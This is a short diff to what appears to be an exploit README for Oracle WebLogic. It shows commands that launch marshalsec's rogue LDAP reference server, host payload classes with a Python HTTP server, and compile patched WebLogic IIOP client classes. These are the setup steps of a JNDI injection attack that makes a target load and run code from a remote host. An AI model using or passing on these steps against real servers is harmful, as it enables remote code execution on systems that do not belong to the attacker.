@@ -12,3 +12,11 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://
 ```
 python -m http.server 9999
 ```
+
+修改代码
+
+```
+javac -cp wlfullclient.jar -source 1.5 -target 1.5 -sourcepath weblogic -d weblogic weblogic/iiop/IORManager.java
+
+javac -cp wlfullclient.jar -source 1.5 -target 1.5 -sourcepath weblogic -d weblogic weblogic/corba/idl/RemoteDelegateImpl.java
+```
